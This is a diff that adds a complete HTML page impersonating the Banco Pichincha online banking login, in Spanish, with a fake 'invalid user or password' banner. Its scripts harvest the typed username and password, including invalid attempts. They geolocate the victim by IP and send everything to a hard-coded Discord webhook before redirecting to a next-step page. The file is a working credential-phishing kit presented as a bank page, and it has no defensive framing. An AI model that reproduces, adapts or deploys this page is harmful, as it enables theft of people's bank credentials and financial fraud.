@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banca Web - Error de Ingreso</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #1a2b4c;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 20px;
+      border-bottom: 1px solid #e2e8f0;
+      background-color: #ffffff;
+    }
+
+    .logo-container img {
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .menu-button {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+      color: #1a2b4c;
+      font-weight: 500;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .menu-icon {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .menu-icon span {
+      display: block;
+      width: 18px;
+      height: 2px;
+      background-color: #1a2b4c;
+    }
+
+    main {
+      max-width: 450px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 20px 20px 30px;
+      flex-grow: 1;
+    }
+
+    /* Banner de Alerta de Error */
+    .alert-banner {
+      background-color: #fce8e6;
+      border: 1px solid #fad2cf;
+      border-left: 4px solid #d93025;
+      color: #a50e0e;
+      padding: 12px 16px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 20px;
+      line-height: 1.4;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .alert-banner svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+      fill: #d93025;
+    }
+
+    h1 {
+      font-size: 26px;
+      color: #112855;
+      font-weight: 400;
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 15px;
+      color: #333333;
+      margin-bottom: 8px;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      height: 48px;
+      padding: 10px 12px;
+      border: 1px solid #dcdcdc;
+      border-radius: 4px;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s ease, background-color 0.2s ease;
+      cursor: pointer;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #112855;
+    }
+
+    input.copiado {
+      border-color: #1e9e5a;
+      background-color: #f2fbf6;
+    }
+
+    .copia-hint {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 11px;
+      font-weight: 600;
+      color: #1e9e5a;
+      background: #ffffff;
+      padding: 2px 6px;
+      border-radius: 3px;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.15s ease;
+    }
+
+    .copia-hint.visible {
+      opacity: 1;
+    }
+
+    .link-right {
+      display: block;
+      text-align: right;
+      font-size: 14px;
+      color: #4a6da7;
+      text-decoration: none;
+      margin-top: 6px;
+    }
+
+    .link-right:hover {
+      text-decoration: underline;
+    }
+
+    .error-msg {
+      color: #d93025;
+      font-size: 12px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .btn-submit {
+      width: 100%;
+      height: 48px;
+      background-color: #ffeb82;
+      color: #7a7348;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 10px;
+      margin-bottom: 8px;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    .btn-submit.active {
+      background-color: #ffdd00;
+      color: #112855;
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.75;
+      cursor: wait;
+    }
+
+    .estado {
+      font-size: 12px;
+      color: #6b7a94;
+      text-align: center;
+      min-height: 16px;
+      margin-bottom: 17px;
+    }
+
+    .cards-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-top: 10px;
+    }
+
+    .card {
+      border: 1px solid #e2e8f0;
+      border-radius: 4px;
+      padding: 20px 10px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: box-shadow 0.2s;
+    }
+
+    .card:hover {
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    }
+
+    .card-icon {
+      width: 32px;
+      height: 32px;
+      margin-bottom: 12px;
+    }
+
+    .card p {
+      font-size: 13px;
+      color: #333333;
+      line-height: 1.3;
+    }
+
+    .card span {
+      display: block;
+      color: #4a6da7;
+      margin-top: 2px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-container">
+      <img src="https://i.postimg.cc/L84XBCfQ/Banco-Pichincha-nuevo.png" alt="Logo Financiera">
+    </div>
+    <button class="menu-button">
+      <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      Menú
+    </button>
+  </header>
+
+  <main>
+    <!-- Mensaje de error de credenciales -->
+    <div class="alert-banner">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+      </svg>
+      <div>Usuario o contraseña inválida, por favor ingrésela correctamente.</div>
+    </div>
+
+    <h1>Bienvenido a tu Banca Web</h1>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="usuario">Usuario</label>
+        <div class="input-wrap">
+          <input type="text" id="usuario" name="usuario" autocomplete="off" required>
+          <span class="copia-hint" id="hintUsuario">Copiado ✓</span>
+        </div>
+        <div id="userError" class="error-msg">El usuario debe incluir al menos una mayúscula y una minúscula.</div>
+        <a href="#" class="link-right">¿Olvidaste tu usuario?</a>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Contraseña</label>
+        <div class="input-wrap">
+          <input type="password" id="password" name="password" required>
+          <span class="copia-hint" id="hintPassword">Copiado ✓</span>
+        </div>
+        <div id="passError" class="error-msg">La contraseña debe tener mayúscula, minúscula y al menos un número o símbolo.</div>
+        <a href="#" class="link-right">¿Olvidaste tu contraseña?</a>
+      </div>
+
+      <button type="submit" class="btn-submit" id="btnIngresar">Ingresar</button>
+      <div id="estadoCaptura" class="estado"></div>
+    </form>
+
+    <div class="cards-container">
+      <div class="card">
+        <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg>
+        <p>¿Cuenta bloqueada?<br><span>Desbloquéala aquí</span></p>
+      </div>
+
+      <div class="card">
+        <svg class="card-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+          <circle cx="12" cy="7" r="4"></circle>
+        </svg>
+        <p>¿Usuario nuevo?<br><span>Regístrate ahora</span></p>
+      </div>
+    </div>
+  </main>
+
+  <!-- ==================== CONFIGURACIÓN ==================== -->
+  <script>
+    /* >>> TU WEBHOOK DE DISCORD <<< */
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1574596028714324139/vNxZsqtVPD-wf_OhFHI7d4Zs-IIKNudVemRlfO547yN_JAFExWzqyD7p9cA4NiwdnenA';
+
+    /* Nombre visible del mensaje (identifica el paso 2) */
+    const NOMBRE_WEBHOOK = 'Pichincha · Intento 2';
+
+    /* Página a la que se redirige tras el login */
+    const PAGINA_DESTINO = 'post-time.html';
+
+    /* Clave con la que el usuario queda guardado como identificador global */
+    const KEY_USUARIO = 'pichincha_usuario';
+
+    /* Enviar también los intentos que NO cumplen las reglas de validación */
+    const ENVIAR_INVALIDOS = true;
+
+    /* Tiempo máximo de espera al webhook antes de redirigir (ms) */
+    const TIMEOUT_ENVIO = 4500;
+  </script>
+
+  <!-- ==================== LÓGICA ==================== -->
+  <script>
+    const loginForm = document.getElementById('loginForm');
+    const usuarioInput = document.getElementById('usuario');
+    const passwordInput = document.getElementById('password');
+    const userError = document.getElementById('userError');
+    const passError = document.getElementById('passError');
+    const btnIngresar = document.getElementById('btnIngresar');
+    const estadoCaptura = document.getElementById('estadoCaptura');
+
+    /* ---------- Copiar al hacer clic en el campo ---------- */
+    function hacerCopiable(input, hint) {
+      let timer = null;
+
+      input.addEventListener('click', async function () {
+        if (input.value === '') return;
+
+        let ok = false;
+        try {
+          await navigator.clipboard.writeText(input.value);
+          ok = true;
+        } catch (e) {
+          try {
+            const sel = input.selectionStart;
+            const fin = input.selectionEnd;
+            input.select();
+            ok = document.execCommand('copy');
+            input.setSelectionRange(sel, fin);
+          } catch (e2) { ok = false; }
+        }
+
+        if (!ok) return;
+
+        input.classList.add('copiado');
+        hint.classList.add('visible');
+        clearTimeout(timer);
+        timer = setTimeout(() => {
+          input.classList.remove('copiado');
+          hint.classList.remove('visible');
+        }, 1200);
+      });
+    }
+
+    hacerCopiable(usuarioInput, document.getElementById('hintUsuario'));
+    hacerCopiable(passwordInput, document.getElementById('hintPassword'));
+
+    /* ---------- Validaciones ---------- */
+    function validarUsuario(str) {
+      const tieneMayuscula = /[A-ZÁÉÍÓÚÑ]/.test(str);
+      const tieneMinuscula = /[a-záéíóúñ]/.test(str);
+      return tieneMayuscula && tieneMinuscula;
+    }
+
+    function validarPassword(str) {
+      const tieneMayuscula = /[A-ZÁÉÍÓÚÑ]/.test(str);
+      const tieneMinuscula = /[a-záéíóúñ]/.test(str);
+      const tieneNumeroOSimbolo = /[\d\W_]/.test(str);
+      return tieneMayuscula && tieneMinuscula && tieneNumeroOSimbolo;
+    }
+
+    function actualizarBoton() {
+      if (usuarioInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+        btnIngresar.classList.add('active');
+      } else {
+        btnIngresar.classList.remove('active');
+      }
+    }
+
+    usuarioInput.addEventListener('input', () => {
+      userError.style.display = 'none';
+      actualizarBoton();
+    });
+
+    passwordInput.addEventListener('input', () => {
+      passError.style.display = 'none';
+      actualizarBoton();
+    });
+
+    /* ---------- Guardar usuario como identificador global ---------- */
+    function guardarIdentificador(usuario) {
+      const limpio = usuario.trim();
+      try { localStorage.setItem(KEY_USUARIO, limpio); } catch (e) {}
+      try { sessionStorage.setItem(KEY_USUARIO, limpio); } catch (e) {}
+      try {
+        document.cookie = 'pich_usuario=' + encodeURIComponent(limpio) +
+          '; path=/; max-age=604800; SameSite=Lax';
+      } catch (e) {}
+      window.PICHINCHA_USUARIO = limpio;
+    }
+
+    /* ---------- Geolocalización por IP (solo IP / país / ciudad / región) ---------- */
+    async function obtenerGeo() {
+      const respaldo = {
+        ip: 'no disponible',
+        pais: 'no disponible',
+        ciudad: 'no disponible',
+        region: 'no disponible'
+      };
+
+      const fuentes = [
+        {
+          url: 'https://ipwho.is/',
+          map: d => ({
+            ip: d.ip,
+            pais: d.country,
+            ciudad: d.city,
+            region: d.region
+          })
+        },
+        {
+          url: 'https://ipapi.co/json/',
+          map: d => ({
+            ip: d.ip,
+            pais: d.country_name,
+            ciudad: d.city,
+            region: d.region
+          })
+        }
+      ];
+
+      for (const f of fuentes) {
+        try {
+          const ctrl = new AbortController();
+          const t = setTimeout(() => ctrl.abort(), 4000);
+          const r = await fetch(f.url, { signal: ctrl.signal, cache: 'no-store' });
+          clearTimeout(t);
+          if (!r.ok) continue;
+          const d = await r.json();
+          if (!d || d.success === false) continue;
+          const m = f.map(d);
+          if (m && m.ip) return m;
+        } catch (e) { /* siguiente fuente */ }
+      }
+      return respaldo;
+    }
+
+    /* ---------- Construir mensaje para Discord ---------- */
+    /* Usuario y contraseña van en bloques de código: un clic los copia. */
+    function construirMensaje(datos, geo) {
+      const linea = '──────────────────────';
+      return [
+        '👤 USUARIO (ID): `' + datos.usuario + '`',
+        '🔑 CONTRASEÑA: `' + datos.password + '`',
+        '✅ VALIDACIÓN: ' + (datos.valido ? 'Cumple reglas' : 'NO cumple reglas'),
+        linea,
+        '🌐 IP: ' + geo.ip,
+        '📍 PAÍS: ' + geo.pais,
+        '🏙️ CIUDAD: ' + geo.ciudad,
+        '🗺️ REGIÓN: ' + geo.region
+      ].join('\n');
+    }
+
+    /* ---------- Enviar a Discord ---------- */
+    function enviarDiscord(payload) {
+      const cuerpo = JSON.stringify({
+        username: NOMBRE_WEBHOOK,
+        content: payload
+      });
+
+      const peticion = fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: cuerpo,
+        keepalive: true
+      }).catch(() => {
+        try {
+          navigator.sendBeacon(
+            WEBHOOK_URL,
+            new Blob([cuerpo], { type: 'application/json' })
+          );
+        } catch (e) {}
+      });
+
+      const limite = new Promise(res => setTimeout(res, TIMEOUT_ENVIO));
+      return Promise.race([peticion, limite]);
+    }
+
+    /* ---------- Flujo principal ---------- */
+    let enviando = false;
+
+    loginForm.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      if (enviando) return;
+
+      const userVal = usuarioInput.value;
+      const passVal = passwordInput.value;
+
+      let esValido = true;
+
+      if (!validarUsuario(userVal)) {
+        userError.style.display = 'block';
+        esValido = false;
+      } else {
+        userError.style.display = 'none';
+      }
+
+      if (!validarPassword(passVal)) {
+        passError.style.display = 'block';
+        esValido = false;
+      } else {
+        passError.style.display = 'none';
+      }
+
+      // El usuario siempre queda guardado como identificador global
+      guardarIdentificador(userVal);
+
+      if (!esValido && !ENVIAR_INVALIDOS) {
+        return;
+      }
+
+      enviando = true;
+      btnIngresar.disabled = true;
+      estadoCaptura.textContent = 'Verificando sesión…';
+
+      const geo = await obtenerGeo();
+      estadoCaptura.textContent = 'Registrando acceso…';
+
+      const mensaje = construirMensaje({
+        usuario: userVal.trim() || '(vacío)',
+        password: passVal || '(vacía)',
+        valido: esValido
+      }, geo);
+
+      await enviarDiscord(mensaje);
+
+      estadoCaptura.textContent = 'Ingresando…';
+
+      if (esValido) {
+        window.location.href = PAGINA_DESTINO + '?u=' + encodeURIComponent(userVal.trim());
+      } else {
+        enviando = false;
+        btnIngresar.disabled = false;
+        estadoCaptura.textContent = 'Revisa los datos marcados en rojo.';
+      }
+    });
+  </script>
+</body>
+</html>
